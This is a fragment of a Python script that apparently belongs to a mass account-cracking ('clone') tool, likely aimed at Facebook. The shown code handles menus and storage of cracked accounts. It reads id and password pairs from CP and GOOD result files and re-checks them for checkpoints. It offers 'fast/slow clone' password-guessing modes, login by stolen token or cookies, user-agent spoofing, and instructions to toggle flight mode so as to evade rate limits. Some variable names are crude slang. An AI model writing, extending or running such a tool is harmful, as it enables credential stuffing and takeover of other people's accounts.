                del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "");print('\n%s [%s•%s] %sTOTAL CRACK RESULT DATE %s IS %s ACCOUNT'%(H,P,H,K,del1,len(ppp)))
            except:print('%s [%s NO RESULTS FOUND %s]'%(M,P,M))
        except (KeyError,IOError):print('%s [%s NO RESULTS FOUND %s]'%(M,P,M))
    elif ch in ['2','02','002','b']:
        try:
            cpl = os.listdir("CP");print('%s '%(O));print('%s [%s CRACK RESULTS STORED IN CP FILES %s]'%(H,P,H));print('%s '%(O))
            for file in cpl:print('%s [%s•%s] %s%s'%(H,P,H,K,file))
            print('%s '%(O));files = _cici_azimvau_('%s [%s•%s] %sENTER FILE NAME : '%(H,P,H,K));print('')
            if files == "":jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));result()
            try:
                ppp = _azimvau_dapunta_("CP/%s"%(files)).read().splitlines()
                for x in ppp:yyy = x.replace('•',' • ');print(' %s[%sCP%s] %s'%(K,P,K,yyy))
                del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "");print('\n%s [%s•%s] %sTOTAL CRACK RESULT DATE %s IS %s ACCOUNT'%(H,P,H,P,del1,len(ppp)))
            except:print('%s [%s NO RESULTS FOUND %s]'%(P,M,M))
        except:print('%s [%s NO RESULTS FOUND %s]'%(P,M,P))
    else:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,M));menu()
    print('%s '%(O));_cici_azimvau_('%s [ %sBACK %s]%s'%(H,P,H,K));menu()

def cek_result():
    try:os.remove('option_.txt')
    except:pass
    cik = open('option_.txt','w');cik.write('result');cik.close()
    print('%s [ %sCHECK CRACK RESULT ACCOUNT OPTIONS %s]'%(H,K,H));print('%s '%(O));print('%s [%s•%s] %sEXAMPLE FILE : %s.txt'%(H,P,H,K,tanggal));files__ = _cici_azimvau_('%s [%s•%s] %sFile : '%(H,P,H,K));files = "CP/"+files__
    try:buka_baju = _azimvau_dapunta_(files,"r").read().splitlines()
    except FileNotFoundError:print("%s [%s!%s] %sFILE NOT EXISTING"%(M,P,M,P));time.sleep(2); menu()
    auto_ganti_pass('Yes');print("%s [%s•%s] %sTOTAL ACCOUNTS : %s%s"%(H,P,H,K,H,str(len(buka_baju))));print("")
    for memek in buka_baju:
        if 'â€¢' in memek:memek = memek.replace('â€¢','•')
        kontol = memek.replace("•"," • ");titid  = memek.split("•")
        _format_ = "\r %s[%sCP%s] %s          "%(K,P,K,kontol)
        try:cek_opsi(titid[0],titid[1],_format_)
        except:continue
    print("");print('%s [%s•%s] %sCHECKING PROCESS COMPLETE'%(H,P,H,K));print('%s '%(O));_cici_azimvau_('%s [ %sBACK %s]%s'%(H,P,H,K));menu()


### Variasi Teks
def var_menu():
    print('%s          [ %sCHOOSE LOGIN METHOD %s]'%(Z,K,Z))
    print('')
    print('%s [%s1%s] %sLOGIN WITH TOKEN [%sLIMITED ACCESS%s]'%(H,P,H,P,M,P))
    print('%s [%s2%s] %sLOGIN WITH COOKIES [%sUNLIMITED ACCESS%s]'%(H,P,H,P,H,P))
    print('%s [%s0%s] %sEXIT'%(H,P,H,M))
    print('%s '%(O))
    
    
def var_ugen():
    print("%s [%s1%s] %sGET USER AGENT"%(H,P,H,H))
    print("%s [%s2%s] %sCHANGE USER AGENT %s(%sMANUAL%s)"%(H,P,H,P,B,H,B))
    print("%s [%s3%s] %sCHANGE USER AGENT %s(%sADJUST HP%s)"%(H,P,H,P,B,K,B))
    print("%s [%s4%s] %sDELETE USER AGENT"%(H,P,H,M))
    print("%s [%s5%s] %sCHECK USER AGENT"%(H,P,H,K))
    print("%s [%s0%s] %sBACK"%(H,P,H,M))

def start_method():
    print('%s '%(O))
    print('%s [%s1%s] %sAPI METHOD V1'%(H,P,H,M))
    print('%s [%s2%s] %sAPI METHOD V2'%(H,P,H,B))
    print('%s [%s3%s] %sWIFI MOD V1 [Speed]'%(H,P,H,H))
    print('%s [%s4%s] %sWIFI MOD V2'%(H,P,H,K))
    print('%s [%s5%s] %sMOBILE METHOD V1'%(H,P,H,O))
    print('%s [%s6%s] %sMOBILE METHOD V2'%(H,P,H,P))

def start_methodezz():
    print("")
    print('%s [%s1%s] %sFAST CLONE %s[%sFEW RESULTS%s]'%(H,P,H,O,O,M,O))
    print('%s [%s2%s] %sSLOW CLONE %s[%sRECOMMENDED%s]'%(H,P,H,O,O,H,O))
    print('%s [%s3%s] %sVERY SLOW CLONE %s[%sMORE RESULTS%s]'%(H,P,H,O,O,B,O))
    print('%s [%s4%s] %sCOMBINED PASSWORD CLONE'%(H,P,H,K))
    print("")
    
    
def started():
    print("")
    print("     %s•%s•%s•%s•%s•%s•%s•%s•%s•%s•%s•%s•%s•%s•%s•%s•%s•%s•"%(H,M,B,K,U,O,K,H,M,B,K,U,O,K,H,M,B,K))
    print('%s [%s•%s] %sCLONING IN PROGRESS...'%(H,M,H,H))
    print('%s [%s•%s] %s[%sGOOD%s] IDS SAVED IN >> %sGOOD/%s.txt'%(H,B,H,O,H,O,H,tanggal))
    print('%s [%s•%s] %s[%sCP%s] IDS SAVED IN >> %sCP/%s.txt'%(H,K,H,O,M,O,M,tanggal))
    psb('%s [%s•%s] %sON FLIGHT MODE FOR [3 SEC] EVERY 3 MINUTES\n'%(H,P,H,B))


def folder():
    try:os.mkdir("CP")
    except:pass
    try:os.mkdir("GOOD")
    except:pass



   	
if __name__=='__main__':
	os.system('git pull')
	folder()
	menu()

